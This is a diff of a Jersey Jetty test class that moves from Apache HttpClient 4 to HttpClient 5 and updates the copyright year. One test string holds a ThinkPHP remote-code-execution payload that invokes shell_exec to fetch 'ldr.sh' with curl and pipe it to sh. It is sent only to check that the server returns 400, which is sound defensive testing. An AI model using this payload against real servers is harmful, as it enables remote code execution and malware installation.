@@ -1,5 +1,5 @@
 /*
- * Copyright (c) 2010, 2022 Oracle and/or its affiliates. All rights reserved.
+ * Copyright (c) 2010, 2024 Oracle and/or its affiliates. All rights reserved.
  *
  * This program and the accompanying materials are made available under the
  * terms of the Eclipse Public License v. 2.0, which is available at
@@ -16,11 +16,11 @@
 
 package org.glassfish.jersey.jetty;
 
-import org.apache.http.HttpHost;
-import org.apache.http.client.methods.CloseableHttpResponse;
-import org.apache.http.impl.client.CloseableHttpClient;
-import org.apache.http.impl.client.HttpClientBuilder;
-import org.apache.http.message.BasicHttpRequest;
+import org.apache.hc.core5.http.HttpHost;
+import org.apache.hc.client5.http.impl.classic.CloseableHttpResponse;
+import org.apache.hc.client5.http.impl.classic.CloseableHttpClient;
+import org.apache.hc.client5.http.impl.classic.HttpClientBuilder;
+import org.apache.hc.core5.http.message.BasicClassicHttpRequest;
 import org.junit.jupiter.api.Test;
 
 import jakarta.ws.rs.GET;
@@ -57,25 +57,25 @@ public class ExceptionTest extends AbstractJettyServerTester {
         String incorrectFragment = "/v1/abcdefgh/abcde/abcdef/abc/a/%3Fs=/Index/\\x5Cthink\\x5Capp/invokefunction"
                 + "&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl+--user-agent+curl_tp5+http://127.0"
                 + ".0.1/ldr.sh|sh";
-        BasicHttpRequest request = new BasicHttpRequest("GET", testUri + incorrectFragment);
+        BasicClassicHttpRequest request = new BasicClassicHttpRequest("GET", testUri + incorrectFragment);
         CloseableHttpClient client = HttpClientBuilder.create().build();
 
         CloseableHttpResponse response = client.execute(new HttpHost(testUri.getHost(), testUri.getPort()), request);
 
-        assertEquals(400, response.getStatusLine().getStatusCode());
+        assertEquals(400, response.getCode());
     }
 
     @Test
     public void test400StatusCodeForIllegalHeaderValue() throws IOException {
         startServer(ExceptionResource.class);
         URI testUri = getUri().build();
-        BasicHttpRequest request = new BasicHttpRequest("GET", testUri.toString() + "/400");
+        BasicClassicHttpRequest request = new BasicClassicHttpRequest("GET", testUri.toString() + "/400");
         request.addHeader("X-Forwarded-Host", "_foo.com");
         CloseableHttpClient client = HttpClientBuilder.create().build();
 
         CloseableHttpResponse response = client.execute(new HttpHost(testUri.getHost(), testUri.getPort()), request);
 
-        assertEquals(400, response.getStatusLine().getStatusCode());
+        assertEquals(400, response.getCode());
     }
 
     @Test
